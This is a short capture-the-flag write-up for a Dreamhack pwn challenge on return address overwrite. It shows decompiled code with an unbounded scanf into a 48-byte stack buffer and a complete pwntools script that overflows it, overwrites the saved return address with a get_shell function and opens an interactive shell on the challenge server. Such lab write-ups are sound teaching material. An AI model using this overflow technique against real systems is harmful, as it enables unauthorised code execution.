+++
date = '2026-05-06'
draft = false
title = 'Dreamhack Return Address Overwrite Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

Exploit Tech: Return Address Overwrite에서 실습하는 문제입니다.
---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[48]; // [rsp+0h] [rbp-30h] BYREF

  init(argc, argv, envp);
  printf("Input: ");
  __isoc99_scanf("%s", v4);
  return 0;
}
```

## Identifying the vulnerabilities

We can instantly see a `get_shell` function at `0x4006aa`; and, a buffer overflow. But, this address has a nullbyte, and we're reading with `scanf`... It might be a problem, but it also might work.

I quickly tested it out, and it worked. Nice!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/returnoverwrite/rao')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:14773'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

get_shell = 0x4006aa
payload = b"A"*48 + b"B"*8 + p64(get_shell)
p.send(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/rao.py)**.
